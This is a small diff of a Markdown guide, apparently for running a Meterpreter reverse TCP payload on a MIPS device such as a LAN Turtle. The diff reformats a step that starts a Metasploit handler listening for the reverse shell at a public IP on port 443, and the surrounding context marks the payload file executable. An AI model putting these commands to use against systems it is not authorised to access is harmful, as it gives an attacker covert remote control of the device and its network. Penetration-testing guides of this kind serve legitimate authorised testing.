@@ -21,11 +21,12 @@ meterpreter-mipsbe-reverse-tcp`
 `chmod 755 /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />
 
 **5 - On Kali: start Meterpreter listerner<br />
-`sudo msfconsole -q -x "use exploit/multi/handler;<br />
-set payload linux/mipsbe/meterpreter_reverse_tcp;<br />
-set lhost 167.99.72.29;<br />
-set LPORT 443;<br />
-exploit -j"`<br />
+####
+sudo msfconsole -q -x "use exploit/multi/handler;
+set payload linux/mipsbe/meterpreter_reverse_tcp;
+set lhost 167.99.72.29;
+set LPORT 443;
+exploit -j"
 
 
 
